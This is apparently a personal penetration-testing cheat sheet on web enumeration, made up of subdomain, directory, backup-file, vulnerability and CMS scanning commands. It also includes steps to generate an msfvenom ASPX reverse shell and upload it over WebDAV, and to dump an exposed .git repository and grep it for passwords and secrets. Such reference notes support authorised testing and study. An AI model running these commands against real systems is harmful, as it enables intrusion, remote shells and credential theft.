---
title: Web Enumeration
type: note
tab: Enum
services: [HTTP, DNS]
tools: [ffuf, gobuster, dnsrecon, dig, feroxbuster, nikto, dirsearch, wpscan, ohmybackup]
inputs: []
outputs: [Subdomains, Directories, Files, Findings]
tags: [HTTP, DNS, Enumeration]
---

# Web

## Subdomain Discovery

#DNS #HTTP #Enumeration
Quick subdomain and vhost discovery reference.

```sh
# DNS brute force with gobuster.
gobuster dns -d <DOMAIN> -w subdomains-top1million-110000.txt

# Virtual host fuzzing with ffuf.
ffuf -w subdomains.txt -u http://<DOMAIN>/ -H "Host: FUZZ.<DOMAIN>"
ffuf -u http://<TARGET_HOST>/ -H "Host: FUZZ.<DOMAIN>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,301,302,403

# Vhost discovery with gobuster.
gobuster vhost -u http://<DOMAIN>/ -w <WORDLIST>
gobuster vhost -u http://<TARGET_HOST> --wordlist /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain

# DNS brute force with dnsrecon.
dnsrecon -d <DOMAIN> -D /usr/share/seclists/Discovery/DNS/namelist.txt -t brt

# Ask a known DNS server for current records.
dig <DOMAIN> ANY +noall +answer @<DNS_IP>
```

## Directory Discovery

#HTTP #Enumeration
Quick directory and file discovery reference.

```sh
# Quick feroxbuster pass.
feroxbuster -u http://<TARGET_IP>

# Custom wordlist with feroxbuster.
feroxbuster -u http://<TARGET_IP> -w <WORDLIST>

# Directory fuzzing with ffuf.
ffuf -u http://<TARGET_IP>/FUZZ -w /usr/share/wordlists/dirb/big.txt

# Directory fuzzing with extensions.
ffuf -w <WORDLIST> -u http://<TARGET_IP>/FUZZ -e .aspx,.html,.php,.txt

# Gobuster directory scan.
gobuster dir -u http://<TARGET_IP>/ -w raft-medium-words.txt

# Smaller DirBuster list.
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

# Dirsearch pass.
dirsearch -u http://<TARGET_IP>/
dirsearch -u http://<TARGET_IP>/ -e php,txt,html,bak,zip -o dirsearch.txt
dirsearch -u http://<TARGET_IP>/ -w <WORDLIST> -o dirsearch.txt

# Feroxbuster with useful extensions.
feroxbuster -u http://<TARGET_IP> -x php,txt,html,json
```

## Metadata Extraction

#HTTP #Enumeration #Looting
Check downloaded documents for usernames, authors, software versions, or internal paths.

```sh
# Extract author metadata from downloaded PDF templates.
exiftool *TEMPLATE.pdf | grep Author
```

## Backup Artifact Discovery

### Backup Artifact Wordlist Scan

#HTTP #Enumeration
Scan for backup files, swap files, archive copies, and old source/database dumps.

```sh
# Backup/swap/archive variants around common index filenames.
ffuf -u http://<TARGET_IP>/FUZZ -w <(printf "index.php\n.index.php\n.#index.php\nindex\n.index\n") -e .swp,.zip,.tar.gz,.bzip,.rar,.gzip,.7z,.bak,.backup,.old,.original,.orig,.save,.sql,.tmp,.gho -mc 200,301,302,403 -fs 0 -t 50

# Quick Vim swap/backup pass.
ffuf -u http://<TARGET_IP>/FUZZ -w <(printf "index.php\n.index.php\n.#index.php\nindex\n.index\n") -e .swp,.swo,.swn,.bak -mc 200,301,302,403 -fs 0
```

### Backup Artifact Discovery With Ohmybackup

#HTTP #Enumeration
Use `ohmybackup` to scan for backup directories and files on a target site.

```sh
git clone https://github.com/tismayil/ohmybackup.git
cd ohmybackup
go run ohmybackup.go --hostname <TARGET_HOST>
go build ohmybackup.go
./ohmybackup --hostname <TARGET_HOST>
```

## Vulnerability Scan

#HTTP #Enumeration
Basic web vulnerability scan.

```sh
nikto -h http://<TARGET_IP>
nikto -h https://<TARGET_IP> -ssl
nikto -h http://<TARGET_IP> -p <PORT> -o nikto.txt
nikto -h http://<TARGET_IP> -Format html -o nikto.html
```

## Technology Fingerprinting

#HTTP #Enumeration
Fingerprint web technologies before choosing wordlists, exploits, or CMS scanners.

```sh
whatweb http://<TARGET_IP>
whatweb -a 3 http://<TARGET_IP>

# Wappalyzer CLI when available.
wappalyzer http://<TARGET_IP>
```

## Nuclei Scan

#HTTP #Enumeration
Run a quick Nuclei pass for known CVEs and exposed configs.

```sh
nuclei -update-templates
nuclei -u http://<TARGET_IP>
nuclei -u http://<TARGET_IP> -severity critical,high
nuclei -u http://<TARGET_IP> -t cves/2021/
nuclei -u http://<TARGET_IP> -t exposures/configs/
nuclei -l targets.txt -severity high,critical -o nuclei-results.txt
```

## WebDAV Upload

#Username #Password #HTTP #Enumeration #Exploitation
If WebDAV is enabled and upload is allowed, generate or copy an ASPX shell and upload it with authenticated `curl`.

```sh
# Check for WebDAV support.
nmap --script http-webdav-scan -p <PORT> <TARGET_IP>

# Copy a known ASPX shell and edit LHOST/LPORT.
locate shell.aspx
cp /usr/share/laudanum/aspx/shell.aspx ./shell.aspx
vi shell.aspx

# Alternative: generate an ASPX reverse shell.
msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -o shell.aspx

# Upload the shell with valid HTTP/WebDAV credentials.
curl -T shell.aspx 'http://<TARGET_IP>/<UPLOAD_PATH>' -u '<USER>:<PASS>'
```

## Exposed Git Repository

#HTTP #Enumeration #Looting
If `/.git/` is exposed, dump the repository, review source, and inspect commit history for removed secrets.

```sh
# Confirm the finding.
nmap -sC -sV -p <PORT> <TARGET_IP>
curl -i http://<TARGET_IP>/.git/HEAD

# Attacker: install git-dumper once, then dump the exposed repository.
git clone https://github.com/arthaud/git-dumper
cd git-dumper
pip install -r requirements.txt
python3 git_dumper.py http://<TARGET_IP>/.git/ dumped_repo

# Review source for credentials and secrets.
cd dumped_repo
grep -RiaE "pass|password|passwd|pwd|secret|token|key|db|database" .

# Review history for secrets that were deleted later.
git log
git log -p
git show <COMMIT_ID>
git grep -i password $(git rev-list --all)
```

## CMS Scan

### Joomla CMS Scan

#HTTP #Enumeration
Scan a Joomla site and enumerate components.

```sh
joomscan -u http://<TARGET_IP> -ec
```

### Drupal CMS Scan

#HTTP #Enumeration
Scan a Drupal site, then search Metasploit for matching Drupal exploit modules.

```sh
droopescan scan -u http://<TARGET_IP>

msfconsole
search drupal_dru
```

### WordPress Scan

#HTTP #Enumeration
Scan WordPress for users, plugins, themes, and vulnerable plugins when an API token is available.

```sh
wpscan --url http://<TARGET_IP>
wpscan --url http://<TARGET_IP> --enumerate u,p,t
wpscan --url http://<TARGET_IP> --enumerate vp --api-token <TOKEN>
```
